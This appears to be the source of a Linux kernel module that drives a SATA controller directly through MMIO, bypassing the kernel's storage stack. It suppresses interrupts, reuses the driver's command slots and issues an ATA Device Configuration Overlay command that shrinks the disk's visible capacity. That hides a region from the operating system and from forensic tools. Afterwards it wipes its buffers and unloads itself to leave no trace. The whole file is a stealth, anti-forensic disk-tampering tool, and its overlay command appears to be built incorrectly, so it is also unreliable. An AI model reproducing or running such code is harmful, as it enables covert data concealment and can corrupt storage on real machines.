#include "stealth_dco.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("System Researcher");
MODULE_DESCRIPTION("Zero-Allocation Pure MMIO Transient Stealth DCO Module with Aligned Method 2 Log Headers");

static int __init ahci_stealth_dco_init(void)
{
    void __iomem *abar_base = NULL;
    void *port_base = NULL;
    void __iomem *slot0_virt = NULL;
    void __iomem *slot31_virt = NULL;
    void __iomem *ctba_virt = NULL;
    void __iomem *data_virt = NULL;

    struct sata_fis_h2d    *fis;
    struct ahci_cmd_header *hdr0, *hdr31;
    struct ahci_prdt_entry *prdt0, *prdt31;

    u64 lst_phys = 0, slot0_ctba_phys = 0, slot31_ctba_phys = 0, data_phys = 0;
    u32 clb_lo, clb_hi, pxis_after, cmd_val, ssts_val;
    int ret = 0;
    u8 *sector_buf;

    pr_info("[STEALTH_DCO] ==================================================\n");
    pr_info("[STEALTH_DCO] ---- METHOD 2/4 + ZERO-ALLOCATION DCO START ------\n");
    pr_info("[STEALTH_DCO] ==================================================\n");

    abar_base = get_stealth_abar_mmio();
    if (!abar_base) {
        pr_err("[STEALTH_DCO] FATAL: Failed to acquire ABAR mapping\n");
        return -ENODEV;
    }

    execute_method2_onchip_mmio_audit(abar_base);
    execute_method4_intx_suppression(abar_base);
    execute_apic_stealth_engine();

    port_base = (void *)((char *)abar_base + AHCI_PORT_BASE);

    ssts_val = readl((char *)port_base + AHCI_PxSSTS);
    pr_info("[STEALTH_DCO] [*] Port SStatus (PxSSTS): 0x%08x\n", ssts_val);

    clb_lo = readl((char *)port_base + AHCI_PxCLB);
    clb_hi = readl((char *)port_base + AHCI_PxCLBU);
    lst_phys = ((u64)clb_hi << 32) | clb_lo;
    if (!lst_phys) {
        pr_err("[STEALTH_DCO] FATAL: PxCLB is 0, port uninitialized\n");
        ret = -ENODEV;
        goto out;
    }

    cmd_val = readl((char *)port_base + AHCI_PxCMD);
    cmd_val |= (1U << 0) | (1U << 4);
    writel(cmd_val, (char *)port_base + AHCI_PxCMD);
    wmb();

    slot0_virt = manual_direct_map(lst_phys + (0 * 32));
    slot31_virt = manual_direct_map(lst_phys + (31 * 32));
    if (!slot0_virt || !slot31_virt) {
        pr_err("[STEALTH_DCO] FATAL: manual_direct_map failed for command slots\n");
        ret = -EFAULT;
        goto out;
    }

    hdr0 = (struct ahci_cmd_header *)slot0_virt;
    slot0_ctba_phys = ((u64)hdr0->ctbau << 32) | hdr0->ctba;

    hdr31 = (struct ahci_cmd_header *)slot31_virt;
    slot31_ctba_phys = ((u64)hdr31->ctbau << 32) | hdr31->ctba;

    if (!slot0_ctba_phys || !slot31_ctba_phys) {
        pr_err("[STEALTH_DCO] FATAL: Pre-allocated CTBA addresses are invalid\n");
        ret = -EFAULT;
        goto out;
    }

    ctba_virt = manual_direct_map(slot31_ctba_phys);
    if (!ctba_virt) {
        pr_err("[STEALTH_DCO] FATAL: Failed to map slot 31 CTBA\n");
        ret = -EFAULT;
        goto out;
    }

    prdt0 = (struct ahci_prdt_entry *)((char *)manual_direct_map(slot0_ctba_phys) + 0x80);
    data_phys = ((u64)prdt0->dbau << 32) | prdt0->dba;
    if (!data_phys) {
        data_phys = slot0_ctba_phys + 0x100;
    }

    data_virt = manual_direct_map(data_phys);
    if (!data_virt) {
        pr_err("[STEALTH_DCO] FATAL: Failed to map pre-allocated data buffer\n");
        ret = -EFAULT;
        goto out;
    }

    memset((void *)ctba_virt, 0, 256);
    memset((void *)data_virt, 0, 512);

    /* Phase 1: Inspect Tail Sector */
    pr_info("[STEALTH_DCO] --- PHASE 1: Inspecting Tail Sector (LBA: %llu) ---\n", (unsigned long long)TARGET_INSPECT_LBA);
    fis = (struct sata_fis_h2d *)ctba_virt;
    fis->fis_type    = 0x27;
    fis->pm_port_c   = 0x80;
    fis->command     = 0x25; /* READ DMA EXT */
    fis->lba0        = (u8)(TARGET_INSPECT_LBA & 0xFF);
    fis->lba1        = (u8)((TARGET_INSPECT_LBA >> 8) & 0xFF);
    fis->lba2        = (u8)((TARGET_INSPECT_LBA >> 16) & 0xFF);
    fis->device      = 0x40;
    fis->lba3        = (u8)((TARGET_INSPECT_LBA >> 24) & 0xFF);
    fis->lba4        = (u8)((TARGET_INSPECT_LBA >> 32) & 0xFF);
    fis->lba5        = (u8)((TARGET_INSPECT_LBA >> 40) & 0xFF);
    fis->count_low   = 0x01;

    prdt31 = (struct ahci_prdt_entry *)((char *)ctba_virt + 0x80);
    prdt31->dba  = (u32)(data_phys & 0xFFFFFFFF);
    prdt31->dbau = (u32)(data_phys >> 32);
    prdt31->dbc  = (511 & 0x3FFFFF);

    hdr31->dw0   = (5 & 0x1F) | (1 << 16); 
    hdr31->dw1   = 0;
    hdr31->ctba  = (u32)(slot31_ctba_phys & 0xFFFFFFFF);
    hdr31->ctbau = (u32)(slot31_ctba_phys >> 32);
    wmb();

    if (execute_ahci_slot_stealth(port_base, 31, false) == 0) {
        sector_buf = (u8 *)data_virt;
        if (*(u64 *)sector_buf == 0x5452415020494645ULL) {
            pr_warn("[STEALTH_DCO] [+] GPT Backup Header detected at tail boundary.\n");
        } else {
            pr_info("[STEALTH_DCO] [+] Tail sector verified successfully.\n");
        }
    } else {
        ret = -EIO;
        goto out;
    }

    /* Phase 2: DCO Micro-Trim */
    pr_info("[STEALTH_DCO] --- PHASE 2: Executing DCO Set (New Max LBA: %llu) ---\n", (unsigned long long)STEALTH_MAX_LBA);
    memset((void *)ctba_virt, 0, 256);
    fis = (struct sata_fis_h2d *)ctba_virt;
    fis->fis_type    = 0x27;
    fis->pm_port_c   = 0x80;
    fis->command     = 0xB1; /* DEVICE CONFIGURATION */
    fis->feature_low = 0xC2; /* SET */
    fis->lba0        = (u8)(STEALTH_MAX_LBA & 0xFF);
    fis->lba1        = (u8)((STEALTH_MAX_LBA >> 8) & 0xFF);
    fis->lba2        = (u8)((STEALTH_MAX_LBA >> 16) & 0xFF);
    fis->device      = 0x40;
    fis->lba3        = (u8)((STEALTH_MAX_LBA >> 24) & 0xFF);
    fis->count_low   = 0x01;

    hdr31->dw0   = (5 & 0x1F) | (0 << 16); 
    hdr31->dw1   = 0;
    hdr31->ctba  = (u32)(slot31_ctba_phys & 0xFFFFFFFF);
    hdr31->ctbau = (u32)(slot31_ctba_phys >> 32);
    wmb();

    if (execute_ahci_slot_stealth(port_base, 31, true) == 0) {
        pxis_after = readl((char *)port_base + AHCI_PxIS);
        if (pxis_after & PxIS_TFES) {
            pr_err("[STEALTH_DCO] [-] Controller rejected DCO command.\n");
            ret = -EIO;
        } else {
            pr_info("[STEALTH_DCO] [++] SUCCESS: DCO applied successfully via Method 2/4 and reused buffers.\n");
            ret = 0;
        }
    } else {
        ret = -EIO;
    }

out:
    if (abar_base)
        iounmap(abar_base);

    /* APIC-serialized stealth sanitization and cache line flushing */
    if (ctba_virt) {
        stealth_sanitize_and_flush((void *)ctba_virt, 256);
    }
    if (data_virt) {
        stealth_sanitize_and_flush((void *)data_virt, 512);
    }
    
    pr_info("[STEALTH_DCO] ---- TRANSIENT EXECUTION FINISHED (ret=%d) ----\n", ret);

    return (ret == 0) ? -ENODEV : ret;
}

static void __exit ahci_stealth_dco_exit(void) {}

module_init(ahci_stealth_dco_init);
module_exit(ahci_stealth_dco_exit);